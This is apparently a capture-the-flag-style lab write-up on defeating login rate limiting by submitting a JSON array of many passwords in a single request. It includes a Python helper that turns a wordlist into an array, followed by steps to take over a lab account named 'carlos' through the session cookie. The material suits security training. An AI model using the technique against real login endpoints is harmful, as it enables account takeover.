# Lab 13: Broken brute-force protection, multiple credentials per request

EXPERT


# Theory

Bypassing rate limits and brute-force protection using multiple credentials in a single request happens when a web application improperly parses structured JSON data ({"username": "user", "password": "123"}) and accepts an array of passwords 
```
{
"username": "user", "password": ["123", 
                                 "password", 
                                 "password123" ]
}
```
instead of a single string


# Method

Copy the candidate passwords file and save as passwd.txt (or any name of your choice).

Next, we create a python script to help turn every line inside passwd to an array

```
input_file = "passwd.txt" # Replace with name you gave the candidate passwords file

with open(input_file, "r") as infile:
    lines = infile.read().splitlines()

formatted_lines = []
for i, line in enumerate(lines):
    if i == len(lines) - 1:
        formatted_lines.append(f'"{line}"')
    else:
        formatted_lines.append(f'"{line}",')

print("[")
    
for line in formatted_lines:
    print(f"  {line}")
        
print("]")
```
Once we have our array object, send a login request to the repeater and supply the copied array in the password parameter with the username set to carlos

Send the request and obtain the cookie from the 302 response

Now, visit /my-account?id=carlos and provide the session cookie

